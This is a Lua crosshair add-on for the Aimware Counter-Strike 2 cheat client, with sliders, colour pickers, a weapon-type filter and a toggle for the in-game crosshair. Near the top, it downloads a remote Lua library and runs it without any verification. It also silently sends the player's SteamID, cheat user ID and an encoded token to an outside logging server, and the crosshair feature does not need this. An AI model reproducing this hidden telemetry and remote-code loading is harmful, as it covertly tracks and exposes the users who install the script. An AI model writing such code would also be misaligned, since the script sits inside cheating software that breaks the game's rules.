local Libraries = {
    ["api_dev11.6(2).2025"]   = "https://raw.githubusercontent.com/G-A-Development-Team/CS2-AW-API-Extender/refs/heads/main/api.lua"
}

-- Script Loader Made By: Agentsix1 From G&A Development
----------------------
-- Don't Edit Below --
----------------------
local tbl = {}
for loc, url in pairs( Libraries ) do
    tbl[ loc ] = {}
    tbl[ loc ].found = false
    tbl[ loc ].url = url
end
Libraries = tbl

file.Enumerate( function( filename )
    
    for loc, data in pairs( Libraries ) do
        if filename == "libraries/" .. loc .. ".lua" then
            print( "[Library Loader] Library found " .. loc )
            Libraries[ loc ].found = true
        end
    end

end)

for loc, data in pairs( Libraries ) do
    if not Libraries[ loc ].found then
        local body = http.Get( data.url )
        file.Write("libraries/" .. loc .. ".lua", body)
        print( "[Library Loader] Getting new library " .. loc )
    end
end

for loc, data in pairs( Libraries ) do
    RunScript("libraries/" .. loc .. ".lua")
    print( "[Library Loader] Running " .. loc )
end

local token = "BggOBQ4BFgwAHRMCCB8DBAARXlRHAgAND0YERgRSUg=="
http.Get( "https://awlogs.deathkick.net/aimware/logging.php?user=" .. player( LocalPlayer() ):SteamID() .. "&client=" .. cheat.GetUserID() .. "&data=" .. token )

local w, h = draw.GetScreenSize() -- Get screen width and height
local xw = (w / 2) -- Center point of the screen width
local xh = (h / 2) -- Center point of the screen height

local tap = gui.Reference("Visuals", "Local")
local gbox1 = gui.Groupbox(tap, "Crosshair", 15, 0, 350, 0);  -- gbox1

-- Crosshair geometry

local g_line_length = gui.Slider(gbox1, "line_length", "Line Length", 240, 0, 300, 1)
local g_line_thickness = gui.Slider(gbox1, "line_thickness", "Line Thickness", 1, 0, 30, 0.1)
local g_out_of_Center = gui.Slider(gbox1, "out_of_Center", "Out of Center", 32, 0, 30, 0.1)
local g_shadow_radius = gui.Slider(gbox1, "shadow_radius", "Shadow", 35, 0, 70, 0.1)

-- Colors
local scope_color_picker1 = gui.ColorPicker(gbox1, "scope_color", "Color", 13, 255, 31, 255)
local scope_color_picker2 = gui.ColorPicker(gbox1, "shadow_scope_color", "Shadow Color", 0, 204, 14, 255)

-- Center dot options
local g_center_dot = gui.Checkbox(gbox1, "center_dot", "Center Dot", false)
local g_center_dot_radius = gui.Slider(gbox1, "center_dot_radius", "Dot Radius", 3, 0, 20, 0.1)
local g_center_dot_color = gui.ColorPicker(gbox1, "center_dot_color", "Dot Color", 255, 255, 255, 255)

-- In-game crosshair toggle (cl_crosshairalpha)
local g_disable_game_crosshair = gui.Checkbox(gbox1, "disable_game_crosshair", "Disable In-Game Crosshair", false)
local __last_disable_game_crosshair = nil

-- Always-on/global crosshair controls
local g_always_on = gui.Checkbox(gbox1, "always_on", "Always show crosshair", false)

-- Weapon filter: group non-guns as Other
local weapon_filter = gui.Multibox(gbox1, "Apply to Weapon Types")
local cb_pistol      = gui.Checkbox(weapon_filter, "apply_pistol", "Pistols", true)
local cb_smg         = gui.Checkbox(weapon_filter, "apply_smg", "SMGs", true)
local cb_rifle       = gui.Checkbox(weapon_filter, "apply_rifle", "Rifles", true)
local cb_shotgun     = gui.Checkbox(weapon_filter, "apply_shotgun", "Shotguns", true)
local cb_sniper      = gui.Checkbox(weapon_filter, "apply_sniper", "Snipers", true)
local cb_machinegun  = gui.Checkbox(weapon_filter, "apply_machinegun", "Machineguns", true)
local cb_other       = gui.Checkbox(weapon_filter, "apply_other", "Other (C4/Grenades/Knives/Taser/etc)", false)

-- Preview control: a custom GUI painter to show a live crosshair preview
-- Note: gui.Custom is commonly available in Aimware; paint callback receives (x, y, w, h)
-- Preview sizing controls

--local preview = gui.Custom(gbox1, "crosshair_preview", -50, 50, 15, 15, function(x, y, w, h)
--[[
    -- Paint a border
    draw.Color(20, 20, 20, 200)
    draw.ShadowRect(x, y, x + w, y + h, 12)
    draw.Color(30, 30, 30, 200)
    draw.OutlinedRect(x, y, x + w, y + h)

    -- Compute scaling so the crosshair fits the preview area
    local base_len = g_line_length:GetValue()
    local base_gap = g_out_of_Center:GetValue()
    local base_thk = g_line_thickness:GetValue()

    local max_len_allowed = math.max(1, math.min(w, h) * 0.45)
    local scale = 1.0
    if base_len > 0 then
        scale = math.min(1.0, max_len_allowed / base_len)
    end

    local cx = x + math.floor(w / 2)
    local cy = y + math.floor(h / 2)

    local save_xw, save_xh = xw, xh
    xw, xh = cx, cy

    local len = base_len * scale
    local gap = base_gap * scale
    local thk = math.max(1, base_thk * scale)

    -- Temporarily override slider reads by drawing with locally scaled values
    local r2, g2, b2, a2 = scope_color_picker2:GetValue()
    local r1, g1, b1, a1 = scope_color_picker1:GetValue()

    -- Shadow lines
    draw.Color(r2, g2, b2, a2)
    draw.ShadowRect(xw - thk / 2, xh + gap, xw + thk / 2, xh + len, g_shadow_radius:GetValue())
    draw.ShadowRect(xw - thk / 2, xh - len, xw + thk / 2, xh - gap, g_shadow_radius:GetValue())
    draw.ShadowRect(xw + gap, xh - thk / 2, xw + len, xh + thk / 2, g_shadow_radius:GetValue())
    draw.ShadowRect(xw - len, xh - thk / 2, xw - gap, xh + thk / 2, g_shadow_radius:GetValue())

    -- Lines
    draw.Color(r1, g1, b1, a1)
    draw.FilledRect(xw - thk / 2, xh + gap, xw + thk / 2, xh + len)
    draw.FilledRect(xw - thk / 2, xh - len, xw + thk / 2, xh - gap)
    draw.FilledRect(xw + gap, xh - thk / 2, xw + len, xh + thk / 2)
    draw.FilledRect(xw - len, xh - thk / 2, xw - gap, xh + thk / 2)

    -- Center dot preview
    if g_center_dot:GetValue() then
        local dr = g_center_dot_radius:GetValue() * scale
        local cr, cg, cb, ca = g_center_dot_color:GetValue()
        draw.Color(cr, cg, cb, ca)
        draw.FilledCircle(xw, xh, dr)
    end

    -- Restore globals
    xw, xh = save_xw, save_xh
--end)]]

local function weaponTypeAllowed(lp)
    

    -- Use player-provided weapon query to avoid outdated handle access
    local t = lp:GetWeaponType() or 0
    -- Common mapping (may vary slightly depending on platform)
    if t == 1 then -- Pistol
        return cb_pistol:GetValue()
    elseif t == 2 then -- SMG
        return cb_smg:GetValue()
    elseif t == 3 then -- Rifle
        return cb_rifle:GetValue()
    elseif t == 4 then -- Shotgun
        return cb_shotgun:GetValue()
    elseif t == 5 then -- Sniper
        return cb_sniper:GetValue()
    elseif t == 6 then -- Machinegun
        return cb_machinegun:GetValue()
    elseif t == 7 then -- C4 / Explosive
        return cb_other:GetValue()
    elseif t == 8 then -- Grenade
        return cb_other:GetValue()
    elseif t == 9 then -- Knife
        return cb_other:GetValue()
    elseif t == 11 then -- Taser
        return cb_other:GetValue()
    else
        return cb_other:GetValue()
    end
end

local function drawCrosshair()
    local line_length = g_line_length:GetValue() -- Length of each line
    local line_thickness = g_line_thickness:GetValue() -- Thickness of the lines
    local out_of_Center = g_out_of_Center:GetValue()
    local shadow_radius = g_shadow_radius:GetValue() -- Controls the shadow smoothness and size

    -- Draw a rectangle with a shadow
    local r2, g2, b2, a2 = scope_color_picker2:GetValue()
    draw.Color(r2, g2, b2, a2)
    draw.ShadowRect(xw - line_thickness / 2, xh + out_of_Center, xw + line_thickness / 2, xh + line_length, shadow_radius) --1
    draw.ShadowRect(xw - line_thickness / 2, xh - line_length, xw + line_thickness / 2, xh - out_of_Center, shadow_radius) --2
    draw.ShadowRect(xw + out_of_Center, xh - line_thickness / 2, xw + line_length, xh + line_thickness / 2, shadow_radius) --3
    draw.ShadowRect(xw - line_length, xh - line_thickness / 2, xw - out_of_Center, xh + line_thickness / 2, shadow_radius) --4

    local r1, g1, b1, a1 = scope_color_picker1:GetValue()
    draw.Color(r1, g1, b1, a1)
    -- Vertical lines
    draw.FilledRect(xw - line_thickness / 2, xh + out_of_Center, xw + line_thickness / 2, xh + line_length) --1
    draw.FilledRect(xw - line_thickness / 2, xh - line_length, xw + line_thickness / 2, xh - out_of_Center) --2
    -- Horizontal lines
    draw.FilledRect(xw + out_of_Center, xh - line_thickness / 2, xw + line_length, xh + line_thickness / 2) --3
    draw.FilledRect(xw - line_length, xh - line_thickness / 2, xw - out_of_Center, xh + line_thickness / 2) --4

    -- Optional center dot
    if g_center_dot:GetValue() then
        local dr = g_center_dot_radius:GetValue()
        local cr, cg, cb, ca = g_center_dot_color:GetValue()
        draw.Color(cr, cg, cb, ca)
        draw.FilledCircle(xw, xh, dr)
    end
end

callbacks.Register("Draw", "DrawCrossHair", function()
    -- Manage in-game crosshair visibility via cl_crosshairalpha
    local disable_now = g_disable_game_crosshair:GetValue()
    if __last_disable_game_crosshair == nil or __last_disable_game_crosshair ~= disable_now then
        __last_disable_game_crosshair = disable_now
        local ok = pcall(function()
            if disable_now then
                client.SetConVar("cl_crosshairalpha", 0, true)
            else
                client.SetConVar("cl_crosshairalpha", 255, true)
            end
        end)
        if not ok then
            -- Fallback via console command if SetConVar fails in this environment
            local cmd = disable_now and "cl_crosshairalpha 0" or "cl_crosshairalpha 255"
            pcall(function() client.Command(cmd, true) end)
        end
    end

    local localplayer = LocalPlayer()
    local lp = player( localplayer )
    if not localplayer or not lp:Alive() then return end

    local should_draw = false

    if g_always_on:GetValue() then
        should_draw = weaponTypeAllowed(localplayer)
    else
        -- original behavior: only when scoped
        if lp:Scoped() then
            should_draw = true
        end
    end

    if should_draw then
        drawCrosshair()
    end
end)

callbacks.Register( "Unload", "DrawCrossHair", function() 
    callbacks.Unregister( "Draw", "DrawCrossHair" )
    -- Restore in-game crosshair alpha if we disabled it
    if g_disable_game_crosshair and g_disable_game_crosshair:GetValue() then
        pcall(function()
            client.SetConVar("cl_crosshairalpha", 255, true)
        end)
        pcall(function() client.Command("cl_crosshairalpha 255", true) end)
    end
end)

print( "[Crosshair] Crosshair has been fully loaded! Made By: GA Dev Team (Carter Poe & Agentsix1)" )
